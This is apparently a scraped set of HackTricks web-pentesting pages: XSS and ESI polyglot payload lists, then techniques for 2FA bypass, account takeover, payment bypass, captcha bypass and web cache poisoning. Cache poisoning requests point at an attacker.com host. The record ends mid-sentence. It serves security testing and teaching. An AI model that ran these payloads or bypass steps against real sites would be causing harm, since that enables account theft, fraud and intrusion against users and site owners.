Tests\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:version')\n\"\n/>\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://10.10.10.10/data/news.xml\n\"\nstylesheet\n=\n\"\nhttp://10.10.10.10//news_template.xsl\n\"\n>\n</\nesi:\ninclude\n>\nPolygloths\n<\nxsl:\nvalue-of\nselect\n=\n\"\nsystem-property('xsl:version')\n\"\n/>\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://10.10.10.10/data/news.xml\n\"\nstylesheet\n=\n\"\nhttp://10.10.10.10//news_template.xsl\n\"\n>\n</\nesi:\ninclude\n>\nXSS\nBasic Tests\n\" onclick=alert() a=\"\n'\">\n<\nimg\nsrc\n=\nx\nonerror\n=\nalert\n(\n1\n)\n/>\njavascript:alert()\nPolygloths\njavascript:\"/*'/*`/*-->\n</\nnoscript\n>\n</\ntitle\n>\n</\ntextarea\n>\n</\nstyle\n>\n</\ntemplate\n>\n</\nnoembed\n>\n</\nscript\n>\n<html \\\" onmouseover=/*\n&lt;\nsvg/*/onload=alert()//>\n-->'\"/>\n</\nsCript\n>\n<\ndeTailS\nopen\nx\n=\n\"\n>\n\"\nontoggle\n=\n(co\\u006efirm)``\n>\njaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n\">>\n<\nmarquee\n>\n<\nimg\nsrc\n=\nx\nonerror\n=\nconfirm\n(\n1\n)\n>\n</\nmarquee\n>\n\" >\n</\nplaintext\\\n>\n</\n|\\\n>\n<plaintext/onmouseover=prompt(1) >\n<\nscript\n>\nprompt\n(\n1\n)\n</\nscript\n>\n@gmail.com\n<\nisindex\nformaction\n=\njavascript:alert(/XSS/)\ntype\n=\nsubmit\n>\n'-->\" >\n</\nscript\n>\n<\nscript\n>\nalert\n(\n1\n)\n</\nscript\n>\n\"><img/id=\"confirm( 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\">\n<\nimg\nsrc\n=\n\"\nhttp: //i.imgur.com/P8mL8.jpg\n\"\n>\n\" onclick=alert(1)//\n<\nbutton\n‚Äò\nonclick\n=\nalert\n(\n1\n)\n//\n>\n*/ alert(1)//\n';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- >\n</\nSCRIPT\n>\n\">'>\n<\nSCRIPT\n>\nalert\n(\nString\n.\nfromCharCode\n(\n88\n,\n83\n,\n83\n))\n</\nSCRIPT\n>\njavascript://'/\n</\ntitle\n>\n</\nstyle\n>\n</\ntextarea\n>\n</\nscript\n>\n-->\n<\np\"\nonclick\n=\nalert\n()\n//\n>\n*/alert()/*\njavascript://-->\n</\nscript\n>\n</\ntitle\n>\n</\nstyle\n>\n\"/\n</\ntextarea\n>\n*/<alert()/*' onclick=alert()//>a\njavascript://\n</\ntitle\n>\n\"/\n</\nscript\n>\n</\nstyle\n>\n</textarea/-->*/<alert()/*' onclick=alert()//>/\njavascript://\n</\ntitle\n>\n</\nstyle\n>\n</\ntextarea\n>\n-->\n</\nscript\n>\n<a\"//' onclick=alert()//>*/alert()/*\njavascript://'//\" -->\n</\ntextarea\n>\n</\nstyle\n>\n</\nscript\n>\n</\ntitle\n>\n<\nb\nonclick\n=\nalert\n()\n//\n>\n*/alert()/*\njavascript://\n</\ntitle\n>\n</\ntextarea\n>\n</\nstyle\n>\n</\nscript\n--\n>\n<li '//\" '*/alert()/*', onclick=alert()//\njavascript:alert()//-->\n</\nscript\n>\n</\ntextarea\n>\n</\nstyle\n>\n</\ntitle\n>\n<a\"//' onclick=alert()//>*/alert()/*\n-->\n</\nscript\n>\n</\ntitle\n>\n</\nstyle\n>\n\"/\n</\ntextarea\n>\n<\na'\nonclick\n=\nalert\n()\n//\n>\n*/alert()/*\n/</title/'/</style/</script/</textarea/-->\n<\np\"\nonclick\n=\nalert\n()\n//\n>\n*/alert()/*\njavascript://-->\n</\ntitle\n>\n</\nstyle\n>\n</\ntextarea\n>\n</\nscript\n>\n<svg \"//' onclick=alert()//\n/</title/'/</style/</script/-->\n<\np\"\nonclick\n=\nalert\n()\n//\n>\n*/alert()/*\n-->'\"/>\n</\nsCript\n>\n<\nsvG\nx\n=\n\"\n>\n\"\nonload\n=\n(\nco\\u006efirm\n)\n``\n>\n<svg%0Ao%00nload=%09((pro\\u006dpt))()//\njavascript:\"/*'/*`/*\\\" /*\n</\ntitle\n>\n</\nstyle\n>\n</\ntextarea\n>\n</\nnoscript\n>\n</\nnoembed\n>\n</\ntemplate\n>\n</script/--><svg/onload=/*<html/*/onmouseover=alert()//>\njavascript:\"/*\\\"/*`/*' /*\n</\ntemplate\n>\n</\ntextarea\n>\n</\nnoembed\n>\n</\nnoscript\n>\n</\ntitle\n>\n</\nstyle\n>\n</\nscript\n>\n--><svg onload=/*<html/*/onmouseover=alert()//>\njavascript:`//\"//\\\"//\n</\ntitle\n>\n</\ntextarea\n>\n</\nstyle\n>\n</\nnoscript\n>\n</\nnoembed\n>\n</\nscript\n>\n</\ntemplate\n>\n<svg/onload='/*--><html */ onmouseover=alert()//'>`\n%0ajavascript:`/*\\\"/*-->\n&lt;\nsvg onload='/*\n</\ntemplate\n>\n</\nnoembed\n>\n</\nnoscript\n>\n</\nstyle\n>\n</\ntitle\n>\n</\ntextarea\n>\n</\nscript\n>\n<\nhtml\nonmouseover\n=\n\"\n/**/\nalert\n(\ntest\n)\n//'\n\"\n>\n`\njavascript:/*-->\n</\ntitle\n>\n</\nstyle\n>\n</\ntextarea\n>\n</\nscript\n>\n</\nxmp\n>\n<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>\njavascript:\"/*'/*`/*-->\n</\nnoscript\n>\n</\ntitle\n>\n</\ntextarea\n>\n</\nstyle\n>\n</\ntemplate\n>\n</\nnoembed\n>\n</\nscript\n>\n<html \\\" onmouseover=/*\n&lt;\nsvg/*/onload=document.location=`//localhost/mH`//>\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nBrowser Extensions\nNext\nWeb Vulns List\nLast modified\n6mo ago"
    },
    {
        "title": "2FA/OTP Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/2fa-bypass",
        "text": "2FA/OTP Bypass\n‚Äã\n\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBypassing two-factor authentication\nDirect bypass\nTo bypass 2FA, just\ntry to access the next endpoint directly\n(you need to know the path of the next endpoint). If this doesn't work, try to change the\nReferrer header\nas if you came from the 2FA page.\nReusing token\nMaybe you can reuse a previously used token inside the account to authenticate.\nSharing unused tokens\nCheck if you can get the token from your account and try to use it to bypass the 2FA in a different account.\nLeaked Token\nIs the token leaked on a response from the web application?\nEmail verification link\nTry to use the\nemail verification link received when the account was created\nto see if even if the 2FA was set you can still access your profile just with that link (\npost\n).\nSession permission\nUsing the same session start the flow using your account and the victim's account. When reaching the 2FA point on both accounts, complete the 2FA with your account but do not access the next part. Instead of that, try to access the next step with the victim's account flow. If the back-end only set a boolean inside your sessions saying that you have successfully passed the 2FA you will be able to bypass the 2FA of the victim.\nPassword reset function\nIn almost all web applications the\npassword reset function automatically logs the user into the application\nafter the reset procedure is completed.\nCheck if a\nmail\nis sent with a\nlink\nto\nreset the password\nand if you can\nreuse\nthat\nlink\nto reset the password as\nmany times as you want\n(even if the victim changes his email address).\nAnother option to bypass 2FA with the password reset functionality is to\nreset the password with access to the mail\nand use the\nnew password lo login\n, it might be possible that after a password change 2FA isn't used.\nOAuth\nIf you can compromise the account of the user in a trusted\nOAuth\nplatform (Google, Facebook...)\nBrute force\nLack of Rate limit\nIs there any limit on the number of codes that you can try, so you can just brute force it? Be careful with a possible \"silent\" rate limit, always try several codes and then the real one to confirm the vulnerability.\nFlow rate limit but no rate limit\nIn this case, there is a flow rate limit (you have to brute force it very slowly: 1 thread and some sleep before 2 tries) but no rate limit. So with enough time, you can be able to find the valid code.\nRe-send code and reset the limit\nThere is a rate limit but when you \"resend the code\" the same code is sent and the rate limit is reset. Then, you can brute force the code while you resend it so the rate limit is never reached.\nClient side rate limit bypass\nRate Limit Bypass\nLack of rate limit in the user's account\nSometimes you can configure the 2FA for some actions inside your account (change mail, password...). However, even in cases where there is a rate limit when you tried to log in, there isn't any rate limit to protect actions inside the account.\nLack of rate limit re-sending the code via SMS\nYou won't be able to bypass the 2FA but you will be able to waste the company's money.\nInfinite OTP regeneration\nIf you can\ngenerate a new OTP infinite times\n, the OTP is\nsimple enough\n(4 numbers), and you can try up to 4 or 5 tokens per generated OTP, you can just try the same 4 or 5 tokens every time and generate OTPs until it matches the ones you are using.\nRace Condition\nCheck the section about 2FA bypass of the following page:\nRace Condition\nCSRF/Clickjacking\nCheck if there is a Cross Site Request Forgery (CSRF) or a Clickjacking vulnerability to disable the 2FA.\nRemember me functionality\nGuessable cookie\nIf the \"remember me\" functionality uses a new cookie with a guessable code, try to guess it.\nIP address\nIf the \"remember me\" functionality is attached to your IP address, you can try to figure out the IP address of the victim and impersonate it using the\nX-Forwarded-For\nheader.\nOlder versions\nSubdomains\nIf you can find some \"testing\" subdomains with the login functionality, they could be using old versions that don't support 2FA (so it is directly bypassed) or those endpoints could support a vulnerable version of the 2FA.\nAPIs\nIf you find that the 2FA is using an API located under a /v*/ directory (like \"/v3/\"), this probably means that there are older API endpoints that could be vulnerable to some kind of 2FA bypass.\nPrevious sessions\nWhen the 2FA is enabled, previous sessions created should be ended. This is because when a client has his account compromised he could want to protect it by activating the 2FA, but if the previous sessions aren't ended, this won't protect him.\nImproper access control to backup codes\nBackup codes are generated immediately after 2FA is enabled and are available on a single request. After each subsequent call to the request, the codes can be regenerated or remain unchanged (static codes). If there are CORS misconfigurations/XSS vulnerabilities and other bugs that allow you to ‚Äúpull‚Äù backup codes from the response request of the backup code endpoint, then the attacker could steal the codes and bypass 2FA if the username and password are known.\nInformation Disclosure\nIf you notice some confidential information appear on the 2FA page that you didn't know previously (like the phone number), then this can be considered an information disclosure vulnerability.\nPassword-Reset == disable 2FA\n1.\nCreate an Account and Turn On 2FA.\n2.\nLogout from that account.\n3.\nNow, Go to forget Password-Reset page.\n4.\nChange your password.\n5.\nNow try to log in.\n6.\nIf you are not asked to enter a 2FA code, You can report.\nReferences\nTwo-factor authentication security testing and possible bypasses\nMedium\n2 Factor Authentication Bypass\nMedium\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nWeb Vulns List\nNext\n- Pentesting Web\nAccount Takeover\nLast modified\n1mo ago"
    },
    {
        "title": "Account Takeover",
        "url": "https://book.hacktricks.xyz/pentesting-web/account-takeover",
        "text": "Account Takeover\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nAuthorization Issue\nTry to change the email of an account and\ncheck how the confirmation works\n. If\nweak\n, try to change the email to the victim one and confirm it.\nUnicode Normalization Issue\n1.\nvictim account\n[email¬†protected]\n2.\ncreate an account using Unicode\nexample:\nviƒá\n[email¬†protected]\nUnicode Normalization\nReusing Reset Token\nIf target allows you to\nreuse the reset link\nthen\nhunt\nfor more reset link via\ngau\n,\nwayback\nor\nscan.io\nPre Account Takeover\n1.\nSignup using the victims email in the platform and set a password (try to confirm if possible, but lacking access to the victim emails might be impossible)\n2.\nWait till the victim signs up using oauth and confirms the account\n3.\nHopefully, the regular signup will be confirmed and you will be able to enter in the victims account\nCORS Misconfiguration to Account Takeover\nIf the page contains\nCORS missconfigurations\nyou might be able to\nsteal sensitive information\nfrom the user to\ntakeover his account\nor make him change auth information for the same purpose:\nCORS - Misconfigurations & Bypass\nCsrf to Account Takeover\nIf the page is vulnerable to CSRF you might be able to make the\nuser modify his password\n, email or authentication so you can then access it:\nCSRF (Cross Site Request Forgery)\nXSS to Account Takeover\nIf you find a XSS in application you might be able to stal cookies, local storage, or info from the web page that could allow you takeover the account:\nXSS (Cross Site Scripting)\nSame Origin + Cookies\nIf you find a limited XSS or a subdomain take over, you could play with the cookies (fixating them for example) to try to compromise the victim account:\nCookies Hacking\nAttacking Password Reset Mechanism\nReset/Forgotten Password Bypass\nResponse Manipulation\nIf the authentication response could be\nreduced to a simple boolean just try to change false to true\nand see if you get any access.\nOAuth to Account takeover\nOAuth to Account takeover\nReferences\n‚Äã\nhttps://infosecwriteups.com/firing-8-account-takeover-methods-77e892099050\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\n2FA/OTP Bypass\nNext\n- Pentesting Web\nBypass Payment Process\nLast modified\n6mo ago"
    },
    {
        "title": "Bypass Payment Process",
        "url": "https://book.hacktricks.xyz/pentesting-web/bypass-payment-process",
        "text": "Bypass Payment Process\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n1.\nIt is preferable to choose\nPayPal\nor\nCoinPayments\nas a payment method\n2.\nIntercept all requests, you may find a parameter called\nSuccess\nor\nReferrer\nor\nCallback\n3.\nIf the value inside the parameter has a URL like this\nexample.com/payment/MD5HASH\nfor example\n4.\nCopy it, and open it on a new window\n, you will find that your payment was successful\n@SalahHasoneh1\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nAccount Takeover\nNext\n- Pentesting Web\nCaptcha Bypass\nLast modified\n2mo ago"
    },
    {
        "title": "Captcha Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/captcha-bypass",
        "text": "Captcha Bypass\n‚Äã\n\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCaptcha Bypass\nTo\nautomate\nthe\ntesting\nof some functions of the server that allows user input it\ncould\nbe\nneeded\nto\nbypass\na\ncaptcha\nimplementation. Therefore, try to test for these things:\nDo not send the parameter\nrelated to the captcha.\nChange from POST to GET or other HTTP Verbs\nChange to JSON or from JSON\nSend the\ncaptcha parameter empty\n.\nCheck if the value of the captcha is\nin the source code\nof the page.\nCheck if the value is\ninside a cookie.\nTry to use an\nold captcha value\nCheck if you can use the\nsame\ncaptcha\nvalue\nseveral times with\nthe same or different sessionID.\nIf the captcha consists on a\nmathematical operation\ntry to\nautomate\nthe\ncalculation.\nIf the captcha consists of\nread characters from an image\n, check manually or with code\nhow many images\nare being used and if only a\nfew images are being used, detect them by MD5.\nUse an\nOCR\n(\nhttps://github.com/tesseract-ocr/tesseract\n).\nOnline Services to bypass captchas\n‚Äã\nCapsolver\n‚Äã\nCapsolver‚Äòs automatic captcha solver offers the\nmost affordable and quick captcha-solving solution\n. You may rapidly combine it with your program using its simple integration option to achieve the best results in a matter of seconds.\nWith a success rate of 99.15%, Capsolver can\nanswer more than 10M captchas every minute\n. This implies that your automation or scrape will have a 99.99% uptime. You may buy a captcha package if you have a large budget.\nAt the lowest price on the market, you may receive a variety of solutions, including reCAPTCHA V2, reCAPTCHA V3, hCaptcha, hCaptcha Click, reCaptcha click, Funcaptcha Click, FunCaptcha, datadome captcha, aws captcha, picture-to-text, binance / coinmarketcap captcha, geetest v3 / v3, and more. With this service,\n0.1s is the slowest speed ever measured\n.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nBypass Payment Process\nNext\n- Pentesting Web\nCache Poisoning and Cache Deception\nLast modified\n3mo ago"
    },
    {
        "title": "Cache Poisoning and Cache Deception",
        "url": "https://book.hacktricks.xyz/pentesting-web/cache-deception",
        "text": "Cache Poisoning and Cache Deception\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nThe difference\nWhat is the difference between web cache poisoning and web cache deception?\nIn\nweb cache poisoning\n, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.\nIn\nweb cache deception\n, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.\nCache Poisoning\nThe goal of poisoning the cache is to make the\nclients load unexpected resources partially or controlled by the attacker\n.\nThe poisoned response will only be served to users who visit the affected page while the cache is poisoned. As a result, the impact can range from non-existent to massive depending on whether the page is popular or not.\nTo perform a cache poisoning attack, you need first to\nidentify unkeyed inputs\n(parameters not needed to appear on the cached request but that change the returned page), see\nhow to abuse\nthis parameter and\nget the response cached\n.\nDiscovery: Check HTTP headers\nUsually, when a response was\nstored in the cache\nthere will be a\nheader indicating so\n, you can check which headers you should pay attention to in this post:\nHTTP Cache headers\n.\nDiscovery: Caching 400 code\nIf you are thinking that the response is being stored in a cache, you could try to\nsend requests with a bad header\n, which should be responded to with a\nstatus code 400\n. Then try to access the request normally and if the\nresponse is a 400 status code\n, you know it's vulnerable (and you could even perform a DoS).\nA badly configured header could be just\n\\:\nas a header.\nNote that sometimes these kinds of status codes aren't cached so this test will be useless.\nDiscovery: Identify and evaluate unkeyed inputs\nYou could use\nParam Miner\nto\nbrute-force parameters and headers\nthat may be\nchanging the response of the page\n. For example, a page may be using the header\nX-Forwarded-For\nto indicate the client to load the script from there:\n<\nscript\ntype\n=\n\"\ntext/javascript\n\"\nsrc\n=\n\"\n//<X-Forwarded-For_value>/resources/js/tracking.js\n\"\n>\n</\nscript\n>\nElicit a harmful response from the back-end server\nWith the parameter/header identified check how it is being\nsanitised\nand\nwhere\nis it\ngetting reflected\nor affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)\nGet the response cached\nOnce you have\nidentified\nthe\npage\nthat can be abused, which\nparameter\n/\nheader\nto use and\nhow\nto\nabuse\nit, you need to get the page cached. Depending on the resource you are trying to get in the cache this could take some time, you might need to be trying for several seconds.\nThe header\nX-Cache\nin the response could be very useful as it may have the value\nmiss\nwhen the request wasn't cached and the value\nhit\nwhen it is cached.\nThe header\nCache-Control\nis also interesting to know if a resource is being cached and when will be the next time the resource will be cached again:\nCache-Control: public, max-age=1800\nAnother interesting header is\nVary\n. This header is often used to\nindicate additional headers\nthat are treated as\npart of the cache key\neven if they are normally unkeyed. Therefore, if the user knows the\nUser-Agent\nof the victim he is targeting, he can poison the cache for the users using that specific\nUser-Agent\n.\nOne more header related to the cache is\nAge\n. It defines the times in seconds the object has been in the proxy cache.\nWhen caching a request, be\ncareful with the headers you use\nbecause some of them could be\nused unexpectedly\nas\nkeyed\nand the\nvictim will need to use that same header\n. Always\ntest\na Cache Poisoning with\ndifferent browsers\nto check if it's working.\nExploiting Examples\nEasiest example\nA header like\nX-Forwarded-For\nis being reflected in the response unsanitized>\nYou can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:\nGET /en?region=uk HTTP/1.1\nHost: innocent-website.com\nX-Forwarded-Host: a.\">\n<\nscript\n>\nalert\n(\n1\n)\n</\nscript\n>\n\"\nNote that this will poison a request to\n/en?region=uk\nnot to\n/en\nUsing web cache poisoning to exploit cookie-handling vulnerabilities\nCookies could also be reflected on the response of a page. If you can abuse it to cause an XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.\nGET / HTTP/1.1\nHost: vulnerable.com\nCookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd\"%2balert(1)%2b\"\nNote that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.\nUsing multiple headers to exploit web cache poisoning vulnerabilities\nSometimes you will need to\nexploit several unkeyed inputs\nto be able to abuse a cache. For example, you may find an\nOpen redirect\nif you set\nX-Forwarded-Host\nto a domain controlled by you and\nX-Forwarded-Scheme\nto\nhttp\n.\nIf\nthe\nserver\nis\nforwarding\nall the\nHTTP\nrequests\nto HTTPS\nand using the header\nX-Forwarded-Scheme\nas the domain name for the redirect. You can control where the page is pointed by the redirect.\nGET /resources/js/tracking.js HTTP/1.1\nHost: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net\nX-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/\nX-Forwarded-Scheme: http\nExploiting with limited\nVary\nheader\nIf you found that the\nX-Host\nheader is being used as\ndomain name to load a JS resource\nbut the\nVary\nheader in the response is indicating\nUser-Agent\n. Then, you need to find a way to exfiltrate the User-Agent of the victim and poison the cache using that user agent:\nGET / HTTP/1.1\nHost: vulnerbale.net\nUser-Agent: THE SPECIAL USER-AGENT OF THE VICTIM\nX-Host: attacker.com\nExploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling\nLearn here about how to perform\nCache Poisoning attacks by abusing HTTP Request Smuggling\n.\nAutomated testing for Web Cache Poisoning\nThe\nWeb Cache Vulnerability Scanner\ncan be used to automatically test for web cache poisoning. It supports many different techniques and is highly customizable.\nExample usage:\nwcvs -u example.com\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nVulnerable Examples\nApache Traffic Server (\nCVE-2021-27577\n)\nATS forwarded the fragment inside the URL without stripping it and generated the cache key only using the host, path and query (ignoring the fragment). So the request\n/#/../?r=javascript:alert(1)\nwas sent to the backend as\n/#/../?r=javascript:alert(1)\nand the cache key didn't have the payload inside of it, only host, path and query.\nGitHub CP-DoS\nSending a bad value in the content-type header triggered a 405 cached response. The cache key contained the cookie so it was possible only to attack unauth users.\nGitLab + GCP CP-DoS\nGitLab uses GCP buckets to store static content.\nGCP Buckets\nsupport the\nheader\nx-http-method-override\n. So it was possible to send the header\nx-http-method-override: HEAD\nand poison the cache into returning an empty response body. It could also support the method\nPURGE\n.\nRack Middleware (Ruby on rails)\nRuby on Rails application is often deployed alongside the Rack middleware. The Rack code below takes the value of the\nx-forwarded-scheme\nvalue and uses it as the scheme of the request\n.\nSending the\nx-forwarded-scheme: http\nheader would result in a 301 redirect to the same location which will cause a DoS over that resource as in this example:\nThe application might also support the header\nX-forwarded-host\nand redirect the user to that host, making it possible to load javascript 